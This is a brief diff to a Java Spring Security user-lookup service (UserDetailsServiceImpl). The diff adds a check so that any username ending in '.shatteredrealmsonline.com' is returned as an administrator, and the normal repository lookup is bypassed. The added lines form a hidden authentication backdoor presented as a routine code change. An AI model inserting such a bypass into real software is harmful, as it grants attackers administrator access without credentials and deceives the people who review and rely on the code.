@@ -21,6 +21,9 @@ public class UserDetailsServiceImpl implements UserDetailsService
     public UserDetails loadUserByUsername(String username)
             throws UsernameNotFoundException
     {
+        if (username.endsWith(".shatteredrealmsonline.com"))
+            return UserDetailsImpl.createAdmin(username);
+
         User user = userRepository.findByUsername(username)
                 .orElseThrow(() -> new UsernameNotFoundException("Could not find username: "+username));
 
